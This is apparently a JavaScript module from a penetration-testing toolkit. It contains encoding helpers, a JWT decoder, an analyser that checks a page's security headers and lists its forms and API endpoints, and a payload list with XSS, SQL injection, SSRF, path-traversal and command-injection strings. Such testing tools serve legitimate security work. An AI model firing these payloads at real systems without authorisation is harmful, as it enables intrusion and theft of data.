/**
 * Braver HackSuite Security Utilities
 * Core cryptographic, encoding, payload library, and target security posture analysis
 * for security researchers and penetration testing workflows.
 */

export function encodeBase64(str) {
  return Buffer.from(str || '', 'utf8').toString('base64');
}

export function decodeBase64(b64) {
  try {
    return Buffer.from(b64 || '', 'base64').toString('utf8');
  } catch (_) {
    return '';
  }
}

export function encodeUrl(str) {
  return encodeURIComponent(str || '');
}

export function decodeUrl(str) {
  try {
    return decodeURIComponent(str || '');
  } catch (_) {
    return str;
  }
}

export function encodeHex(str) {
  return Buffer.from(str || '', 'utf8').toString('hex');
}

export function decodeHex(hex) {
  try {
    const clean = (hex || '').replace(/^0x/i, '').replace(/\s+/g, '');
    return Buffer.from(clean, 'hex').toString('utf8');
  } catch (_) {
    return '';
  }
}

/**
 * Decodes a JSON Web Token (JWT) into its components with validation.
 * @param {string} token 
 */
export function decodeJwt(token) {
  const parts = (token || '').trim().split('.');
  if (parts.length < 2) {
    return { valid: false, error: 'Invalid JWT format: Requires at least header and payload segments' };
  }

  try {
    const base64UrlDecode = (str) => {
      let b64 = str.replace(/-/g, '+').replace(/_/g, '/');
      while (b64.length % 4 !== 0) b64 += '=';
      return Buffer.from(b64, 'base64').toString('utf8');
    };

    const header = JSON.parse(base64UrlDecode(parts[0]));
    const payload = JSON.parse(base64UrlDecode(parts[1]));
    const signature = parts[2] || '';

    const nowSec = Math.floor(Date.now() / 1000);
    const expired = payload.exp ? nowSec > payload.exp : false;

    return {
      valid: true,
      header,
      payload,
      signature,
      expired,
      raw: token
    };
  } catch (err) {
    return { valid: false, error: `JWT decoding failed: ${err.message}` };
  }
}

export const SECURITY_PAYLOADS = {
  xss: [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(document.domain)>',
    'javascript:alert(1)',
    '\'"><svg/onload=alert(1)>',
    '<iframe src="javascript:alert(`XSS`)"></iframe>',
    '"><details open ontoggle=alert(1)>'
  ],
  sqli: [
    "' OR 1=1--",
    "' UNION SELECT null, username, password FROM users--",
    "admin'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' ORDER BY 1,2,3--",
    "1' AND 1=0 UNION ALL SELECT @@version, null--"
  ],
  ssrf: [
    'http://169.254.169.254/latest/meta-data/',
    'http://127.0.0.1:8080/v1/models',
    'http://localhost:22',
    'http://metadata.google.internal/computeMetadata/v1/'
  ],
  lfi: [
    '../../../../etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '/proc/self/environ',
    'file:///etc/hosts'
  ],
  cmdi: [
    '; id;',
    '| whoami',
    '$(id)',
    '; cat /etc/passwd;',
    '&& uname -a'
  ]
};

/**
 * Analyzes security posture, forms, and headers of target HTML.
 */
export function analyzeSecurityPosture(html = '', targetUrl = '', headers = {}) {
  const normalizedHeaders = {};
  for (const [k, v] of Object.entries(headers || {})) {
    normalizedHeaders[k.toLowerCase()] = v;
  }

  // Check critical security headers
  const securityHeaderChecklist = [
    'content-security-policy',
    'x-frame-options',
    'strict-transport-security',
    'x-content-type-options',
    'referrer-policy',
    'permissions-policy'
  ];

  const presentHeaders = [];
  const missingHeaders = [];

  for (const hdr of securityHeaderChecklist) {
    if (normalizedHeaders[hdr]) {
      presentHeaders.push(hdr);
    } else {
      // Capitalize for display
      const display = hdr.split('-').map(w => w.charAt(0).toUpperCase() + w.slice(1)).join('-');
      missingHeaders.push(display === 'Strict-Transport-Security' ? 'Strict-Transport-Security' : (
        display === 'Content-Security-Policy' ? 'Content-Security-Policy' : (
          display === 'X-Frame-Options' ? 'X-Frame-Options' : (
            display === 'X-Content-Type-Options' ? 'X-Content-Type-Options' : display
          )
        )
      ));
    }
  }

  // Extract forms and input elements
  const forms = [];
  const formRegex = /<form\b([^>]*)>([\s\S]*?)<\/form>/gi;
  let match;
  while ((match = formRegex.exec(html)) !== null) {
    const formAttr = match[1];
    const formInner = match[2];

    const actionMatch = formAttr.match(/action=["']([^"']*)["']/i);
    const methodMatch = formAttr.match(/method=["']([^"']*)["']/i);

    forms.push({
      action: actionMatch ? actionMatch[1] : '',
      method: methodMatch ? methodMatch[1].toUpperCase() : 'GET',
      raw: match[0].slice(0, 200)
    });
  }

  // Extract inputs
  const inputs = [];
  const inputRegex = /<input\b([^>]*)>/gi;
  while ((match = inputRegex.exec(html)) !== null) {
    const inputAttr = match[1];
    const nameMatch = inputAttr.match(/name=["']([^"']*)["']/i);
    const typeMatch = inputAttr.match(/type=["']([^"']*)["']/i);
    const valueMatch = inputAttr.match(/value=["']([^"']*)["']/i);

    inputs.push({
      name: nameMatch ? nameMatch[1] : 'unnamed',
      type: typeMatch ? typeMatch[1].toLowerCase() : 'text',
      value: valueMatch ? valueMatch[1] : ''
    });
  }

  // Discover potential API endpoints from scripts and fetch calls
  const endpoints = new Set();
  const endpointRegexes = [
    /(?:fetch|axios(?:\.[a-z]+)?)\s*\(\s*['"`]([^'"`]+)['"`]/gi,
    /['"`](\/api\/[a-zA-Z0-9_\-\/]+|\/[a-zA-Z0-9_\-]+\.(?:json|php|asp|jsp))['"`]/gi
  ];
  for (const regex of endpointRegexes) {
    let m;
    while ((m = regex.exec(html)) !== null) {
      if (m[1]) endpoints.add(m[1].split('?')[0]);
    }
  }

  // Also check explicit script sources
  const scriptRegex = /<script\b[^>]*src=["']([^"']*)["']/gi;
  const scripts = [];
  while ((match = scriptRegex.exec(html)) !== null) {
    scripts.push(match[1]);
  }

  return {
    targetUrl,
    forms,
    inputs,
    endpoints: Array.from(endpoints),
    scripts,
    presentHeaders,
    missingHeaders,
    riskRating: missingHeaders.length >= 3 ? 'ELEVATED' : 'MODERATE',
    summary: {
      formsCount: forms.length,
      inputsCount: inputs.length,
      endpointsCount: endpoints.size,
      missingHeadersCount: missingHeaders.length
    }
  };
}
